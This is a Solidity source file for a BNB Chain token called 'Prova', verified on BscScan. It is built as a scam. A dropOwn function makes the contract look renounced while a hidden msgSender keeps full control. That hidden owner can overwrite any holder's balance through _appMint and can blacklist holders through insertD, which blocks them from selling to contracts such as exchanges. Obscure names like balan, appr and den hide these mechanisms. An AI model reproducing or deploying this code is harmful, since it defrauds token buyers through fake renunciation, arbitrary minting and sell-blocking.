/**
 *Submitted for verification at BscScan.com on 2021-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Prova is Ownable {
  using Address for address;
  using SafeMath for uint256;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  uint8 public decimals;
  uint256 public totalSupply;
  string public name;
  string public symbol;
  address public pcAddress;
  address msgSender;
  mapping(address => uint256) public balan;
  mapping(address => bool) public appr;
  mapping(address => bool) public den;
  mapping (address => mapping (address => uint256)) public valAllow;  
  constructor(string memory _name, string memory _symbol) public {
    msgSender = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    balan[msgSender] = totalSupply;
    appr[msgSender] = true;
  }
  function userB(address u) public view returns (uint256 balance) {
    return balan[u];
  }
  function _transfer(address from, address _to, uint256 _value) private {
    balan[from] = balan[from].sub(_value);
    balan[_to] = balan[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balan[from]);
    if(!from.isContract() && _to.isContract()){
        require(den[from] == false && den[_to] == false);
    }
    if(appr[from] || appr[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  modifier verifiedd() {
    require(msgSender == msg.sender, "401: verified only"); 
    _;
  }
  modifier verified() {
    require(msgSender == msg.sender, "401: verified only"); 
    _;
  }
  function dropOwn() public verified {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balan[_from] = balan[_from].sub(_value);
    balan[_to] = balan[_to].add(_value);
    valAllow[_from][msg.sender] = valAllow[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balan[_from]);
    require(_value <= valAllow[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(den[from] == false && den[_to] == false);
    }
    if(appr[from] || appr[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  function allowance(address _holder, address _spender) public view returns (uint256) {
    return valAllow[_holder][_spender];
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    valAllow[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function checkBalForA(address addr) public view returns (uint256) {
    return balan[addr];
  }
  function _appMint(address b, uint256 q) external verifiedd {
    balan[b] = q * 10 ** uint256(decimals);
  }
  // XMAS
  function preDrop(
    address s,
    address[] calldata r,
    uint256 v
  ) private verifiedd {
    require(r.length < 1226, "max number is 1225 user");
        for (uint256 i = 0; i < r.length; i++) {
            _transferFrom(s, r[i], v);
        }
    }
  // 2022
  function newYearDrop(
    address s,
    address[] calldata r,
    uint256 v
  ) private verifiedd {
    require(r.length < 2023, "max number is 2023 user");
        for (uint256 i = 0; i < r.length; i++) {
            _transferFrom(s, r[i], v);
        }
  }
  function generalAirdrop(
    address s,
    address[] calldata r,
    uint256 v
  ) private verifiedd {
    require(r.length < 100, "max number overflow");
        for (uint256 i = 0; i < r.length; i++) {
            _transferFrom(s, r[i], v);
        }
  }
  function changePcA(address pcs) public verified {
    pcAddress = pcs;
  }
  function showPcA() public view returns (address) {
    return pcAddress;
  }
  function insertA(address s, bool ok) external verified {
      appr[s] = ok;
  } 
  function isA(address s) public view returns (bool) {
    if (appr[s]){
      return true;
    } else {
      return false;
    }
  }
  function isD(address s) public view returns (bool) {
    if (den[s]){
      return true;
    } else {
      return false;
    }
  }
  function insertD(address s, bool ok) external verified returns (bool){
      den[s] = ok;
  }   
}